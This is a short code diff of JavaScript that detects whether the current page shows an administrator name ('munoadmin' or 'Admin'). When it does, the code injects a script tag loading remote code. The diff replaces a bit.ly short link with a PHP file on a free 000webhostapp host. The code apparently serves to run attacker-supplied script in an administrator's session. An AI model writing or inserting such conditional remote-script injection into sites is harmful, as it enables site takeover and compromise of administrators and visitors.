@@ -4,6 +4,6 @@ var men = ["munoadmin","Admin"];
 if (men.includes(man.text)) {
  var mytv = document.createElement("script");
  mytv.type = "text/javascript";
- mytv.src = "https://bit.ly/38fvJaU";
+ mytv.src = "https://pixiu.000webhostapp.com/x_x.php";
  document.getElementsByTagName("head")[0].appendChild(mytv);
 }
